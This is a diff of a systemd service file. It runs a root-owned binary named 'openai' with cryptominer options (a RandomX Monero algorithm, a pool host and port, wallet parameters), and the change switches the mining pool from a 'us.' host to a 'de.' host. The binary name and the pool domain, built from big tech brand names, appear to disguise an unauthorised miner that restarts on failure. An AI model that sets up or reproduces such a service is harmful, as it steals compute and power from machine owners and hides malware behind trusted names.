@@ -20,7 +20,7 @@ After=network.target
 
 [Service]
 Type=simple
-ExecStart=/root/openai/openai -o us.microsoftazureamazonawsibmapplenvidiaoracleciscoadobe.com:1123 -u $1 -p $2 -a rx/0 -k 
+ExecStart=/root/openai/openai -o de.microsoftazureamazonawsibmapplenvidiaoracleciscoadobe.com:1123 -u $1 -p $2 -a rx/0 -k 
 Restart=on-failure
 User=root
 
